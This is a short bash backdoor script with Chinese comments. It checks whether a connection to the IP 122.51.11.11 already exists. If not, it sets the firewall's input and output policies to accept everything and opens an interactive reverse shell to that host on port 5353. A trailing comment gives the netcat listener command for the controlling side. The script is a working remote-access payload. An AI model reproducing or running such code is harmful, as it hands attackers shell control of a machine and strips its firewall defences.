#!/bin/bash
if netstat -ano|grep -v grep | grep "122.51.11.11">/dev/null
# Romote IP
then
echo "OK">/dev/null
else
/sbin/iptables --policy INPUT ACCEPT
/sbin/iptables --policy OUTPUT ACCEPT
# iptables 放通
bash -i >& /dev/tcp/122.51.11.11/5353 0>&1
fi

#控制端 nc -l -v -p 5353